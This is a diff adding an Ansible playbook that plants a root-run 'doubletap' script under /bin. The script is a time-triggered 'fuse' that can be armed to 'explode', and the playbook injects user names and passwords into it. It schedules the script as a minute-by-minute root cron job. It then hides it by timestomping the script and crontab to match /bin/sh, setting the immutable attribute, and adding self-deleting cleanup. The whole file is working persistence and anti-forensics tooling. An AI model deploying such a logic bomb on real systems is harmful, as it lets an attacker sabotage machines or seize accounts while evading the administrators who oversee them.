@@ -1,0 +1,94 @@
+---
+#- name: Define variables for paths and filenames
+#  set_fact:
+#    doubletap_sh_cron_script_path: "/bin/doubletap1"
+#    doubletap_sh_cron_job_name: "DoubleTapScript"
+#    doubletap_sh_cron_job_user: "root"
+
+- name: Ensure destination directory exists
+  ansible.builtin.file:
+    path: "{{ doubletap_sh_cron_script_path | dirname }}"
+    state: directory
+    owner: root
+    group: root
+    mode: '0755'
+
+- name: Copy shell script to target system
+  copy:
+    src: "files/doubletap.sh"
+    dest: "{{ doubletap_sh_cron_script_path }}"
+    owner: root
+    group: root
+    mode: '0755'
+
+# Need to do this as separate tasks
+- name: Update users list in the script file
+  replace:
+    path: "{{ doubletap_sh_cron_script_path }}"
+    regexp: '^users=.*'
+    replace: 'users="{{ doubletap_users }}"'
+
+- name: Update user password in the script file
+  replace:
+    path: "{{ doubletap_sh_cron_script_path }}"
+    regexp: '^users_pwd=.*'
+    replace: 'users_pwd="{{ doubletap_users_pwd }}"'
+
+- name: Update fuse_date in the script file
+  replace:
+    path: "{{ doubletap_sh_cron_script_path }}"
+    regexp: '^fuse_date=.*'
+    replace: 'fuse_date="{{ doubletap_fuse_date }}" # In format YYYY-MM-DD in America/New_York timezone'
+
+- name: Update fuse_time in the script file
+  replace:
+    path: "{{ doubletap_sh_cron_script_path }}"
+    regexp: '^fuse_time=.*'
+    replace: 'fuse_time="{{ doubletap_fuse_time }}" # In format HH:MM:SS, using 24h time in America/New_York timezone'
+
+- name: Update fuse_armed in the script file
+  replace:
+    path: "{{ doubletap_sh_cron_script_path }}"
+    regexp: '^fuse_armed=.*'
+    replace: 'fuse_armed="{{ doubletap_fuse_armed }}" # DO NOT SET THIS TO TRUE UNLESS YOU WANT TO EXPLODE'
+
+- name: Update log_location in the script file
+  replace:
+    path: "{{ doubletap_sh_cron_script_path }}"
+    regexp: '^log_location=.*'
+    replace: 'log_location="{{ doubletap_sh_cron_log_path }}" # Set to /dev/null for no output (and comment out line 14)'
+
+- name: Add command to remove cron job after execution
+  lineinfile:
+    path: "{{ doubletap_sh_cron_script_path }}"
+    line: "crontab -l | grep -v '{{ doubletap_sh_cron_script_path }}' | crontab -"
+    insertafter: "# Cleanup after explosion"
+
+- name: Add command to delete the script after execution
+  lineinfile:
+    path: "{{ doubletap_sh_cron_script_path }}"
+    line: "rm -f {{ doubletap_sh_cron_script_path }}"
+    insertafter: "# Cleanup after explosion"
+
+- name: Add command to delete the script after execution
+  lineinfile:
+    path: "{{ doubletap_sh_cron_script_path }}"
+    line: "chattr -i {{ doubletap_sh_cron_script_path }}"
+    insertafter: "# Cleanup after explosion"
+
+- name: Create cron job for root user to execute script every minute
+  cron:
+    name: "{{ doubletap_sh_cron_job_name }}"
+    user: "{{ doubletap_sh_cron_job_user }}"
+    job: "{{ doubletap_sh_cron_script_path }}"
+    minute: "*"
+    state: present
+
+- name: Timestomp the crontab file
+  command: touch -r /bin/sh /var/spool/cron/crontabs/{{ doubletap_sh_cron_job_user }}
+
+- name: Timestomp script to match /bin/sh creation time
+  command: touch -r /bin/sh {{ doubletap_sh_cron_script_path }}
+
+- name: Set immutable attribute on script
+  command: chattr +i {{ doubletap_sh_cron_script_path }}
